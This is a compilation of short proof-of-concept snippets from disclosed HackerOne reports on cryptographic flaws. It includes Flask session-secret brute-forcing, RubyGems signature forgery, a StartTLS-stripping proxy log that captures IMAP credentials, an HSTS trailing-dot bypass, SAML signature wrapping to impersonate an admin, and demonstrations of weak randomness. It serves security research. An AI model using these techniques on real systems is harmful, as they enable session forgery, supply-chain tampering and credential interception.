# Cryptographic Weaknesses  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1387366](https://hackerone.com/reports/1387366)  -  elections.k8s.io uses weak session secret key, may place elections at risk
*high, $250*

```
% curl https://elections.k8s.io -Is | grep cookie
set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg; Expires=Thu, 02 Dec 2021 07:23:10 GMT; HttpOnly; Path=/

% flask-unsign -u -c "eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg"
[*] Session decodes to: {'_permanent': True}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 8192 attemptspdcQHNyXaB0O
'N/A'
```

## 2. [#1039504](https://hackerone.com/reports/1039504)  -  Some build dependencies are downloaded over an insecure channel (without subsequent integrity checks)
*high, $100*

```shell
download_tap_windows () {
    if [ ! -f "download-cache/tap-windows-${TAP_WINDOWS_VERSION}.zip" ]; then
       wget -P download-cache/ \
           "http://build.openvpn.net/downloads/releases/tap-windows-${TAP_WINDOWS_VERSION}.zip"
    fi
}

download_lzo () {
    if [ ! -f "download-cache/lzo-${LZO_VERSION}.tar.gz" ]; then
        wget -P download-cache/ \
            "http://www.oberhumer.com/opensource/lzo/download/lzo-${LZO_VERSION}.tar.gz"
    fi
}
```

## 3. [#275269](https://hackerone.com/reports/275269)  -  Gem signature forgery
*medium, $1,000*

```bash
$ gem --version
2.5.2
$ wget https://raw.githubusercontent.com/intridea/multi_json/master/certs/rwz.pem
$ gem cert --add rwz.pem
Added '/CN=pavel/DC=pravosud/DC=com'
$ gem install --install-dir install -P HighSecurity multi_json-1.12.2.gem
Successfully installed multi_json-1.12.2
1 gem installed
$ ls install/gems/multi_json-1.12.2/
HACKED
```

## 4. [#275269](https://hackerone.com/reports/275269)  -  Gem signature forgery
*medium, $1,000*

```bash
$ gem fetch multi_json
$ mkdir orig
$ mv multi_json-1.12.2.gem orig/
$ echo hacked > HACKED
$ tar czf data.tar.gz HACKED
$ ./forge-gem.sh orig/multi_json-1.12.2.gem data.tar.gz forged.gem
```

## 5. [#1178562](https://hackerone.com/reports/1178562)  -  imap: StartTLS stripping attack (CVE-2016-0772).
*medium*

```bash
$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> connecting to target ('imap.yandex.ru', 143)
2021-04-28 18:43:27,347 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\r\n'
2021-04-28 18:43:27,348 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>
2021-04-28 18:43:27,348 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0001 STARTTLS\r\n'
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server][mangled] None
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\r\n'
...
```

## 6. [#1557449](https://hackerone.com/reports/1557449)  -  CVE-2022-30115: HSTS bypass via trailing dot
*medium*

```bash
curl --hsts hsts.txt http://accounts.google.com.
```

## 7. [#356284](https://hackerone.com/reports/356284)  -  Samlify is vulnerable to signature wrapping
*high*

```
test('should reject signature wrapped response', async t => {
  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)
  const user = { email: 'user@esaml2.com' };
  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));
  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)

  //Decode
  var buffer = new Buffer(SAMLResponse, "base64");
  var xml = buffer.toString();
  //Create version of response without signature
  var stripped = xml
    .replace(/<ds:Signature[\s\S]*ds:Signature>/, "");
  //Create version of response with altered IDs and new username
  var outer = xml
    .replace(/assertion" ID="_[0-9a-f]{3}/g, 'assertion" ID="_000')
    .replace("user@esaml2.com", "admin@esaml2.com");
  //Put stripped version under SubjectConfirmationData of modified version
  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\/>/, "<saml:SubjectConfirmationData>" + stripped.replace('<?xml version="1.0" encoding="UTF-8"?>', "") + "</saml:SubjectConfirmationData>");
  const wrappedResponse = new Buffer(xmlWrapped).toString("base64");

  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });
  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));
  //This tampering goes undetected....and only fails because there are now two names
  t.is(extract.nameid, 'user@esaml2.com');
});
# … truncated …
```

## 8. [#1178562](https://hackerone.com/reports/1178562)  -  imap: StartTLS stripping attack (CVE-2016-0772).
*medium*

```
2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0001 STARTTLS\r\n'
2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0002 AUTHENTICATE'
2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          ' LOGIN\r\n'
2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+\r\n'
2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lX3VzZXI=\r\n'
2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\r\n'
2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\r\n'
2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
2021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA=='
2021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          '\r\n'
2021-04-28 18:47:00,635 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server]          'RUBY0002 BAD Command syntax error. sc=PleRNJ32YGk1_281547_4-d4596b06cae3\r\n'
# … truncated …
```

## 9. [#1039504](https://hackerone.com/reports/1039504)  -  Some build dependencies are downloaded over an insecure channel (without subsequent integrity checks)
*high, $100*

```
${TAP_WINDOWS_VERSION}
```

## 10. [#1039504](https://hackerone.com/reports/1039504)  -  Some build dependencies are downloaded over an insecure channel (without subsequent integrity checks)
*high, $100*

```
${LZO_VERSION}
```

## 11. [#1536013](https://hackerone.com/reports/1536013)  -  Possibility to guess email address from gravatar image URL
*low*

```
❯ ruby test.rb
     55502f40dc8b7c769880b10874abc9d0
```

## 12. [#1745702](https://hackerone.com/reports/1745702)  -  Insecure randomness for default password in file sharing when password policy app is disabled
*low*

```php
export default async function() {
	// password policy is enabled, let's request a pass
	if (config.passwordPolicy.api && config.passwordPolicy.api.generate) {
		try {
			const request = await axios.get(config.passwordPolicy.api.generate)
			if (request.data.ocs.data.password) {
				return request.data.ocs.data.password
			}
		} catch (error) {
			console.info('Error generating password from password_policy', error)
		}
	}

	// generate password of 10 length based on passwordSet
	return Array(10).fill(0)
		.reduce((prev, curr) => {
			prev += passwordSet.charAt(Math.floor(Math.random() * passwordSet.length))
			return prev
		}, '')
}
```

## 13. [#275269](https://hackerone.com/reports/275269)  -  Gem signature forgery
*medium, $1,000*

```bash
$ tar tvf multi_json-1.12.2.gem
-r--r--r-- wheel/wheel     163 2017-10-05 16:05 data.tar.gz
-r--r--r-- wheel/wheel    1840 2017-09-04 21:51 metadata.gz
-r--r--r-- wheel/wheel     256 2017-09-04 21:51 metadata.gz.sig
-r--r--r-- wheel/wheel   16908 2017-09-04 21:51 data.tar.gz
-r--r--r-- wheel/wheel     256 2017-09-04 21:51 data.tar.gz.sig
-r--r--r-- wheel/wheel     270 2017-09-04 21:51 checksums.yaml.gz
-r--r--r-- wheel/wheel     256 2017-09-04 21:51 checksums.yaml.gz.sig
```

## 14. [#275269](https://hackerone.com/reports/275269)  -  Gem signature forgery
*medium, $1,000*

```python
def verify_entry entry
    file_name = entry.full_name
    @files << file_name

    case file_name
    when /\.sig$/ then
      @signatures[$`] = entry.read if @security_policy
      return
    else
      digest entry
    end

    case file_name
    when /^metadata(.gz)?$/ then
      load_spec entry
    when 'data.tar.gz' then
      verify_gz entry
    end
  rescue => e
    message = "package is corrupt, exception while verifying: " +
              "#{e.message} (#{e.class})"
    raise Gem::Package::FormatError.new message, @gem
  end
```

## 15. [#2913312](https://hackerone.com/reports/2913312)  -  Usage of unsafe random function in undici for choosing boundary
*medium*

```bash
$ node --version
v22.12.0
$ node ./server.js
```

## 16. [#678989](https://hackerone.com/reports/678989)  -  [crypto-js] Insecure entropy source - Math.random()
*medium*

```bash
$ node --random_seed=42 -e "console.log(require('crypto-js').lib.WordArray.random(16))"
{ words: [ -1477405629, 964516052, 1254255372, 1089500106 ],
  sigBytes: 16 }
$ node --random_seed=42 -e "console.log(require('crypto-js').lib.WordArray.random(16))"
{ words: [ -1477405629, 964516052, 1254255372, 1089500106 ],
  sigBytes: 16 }
```
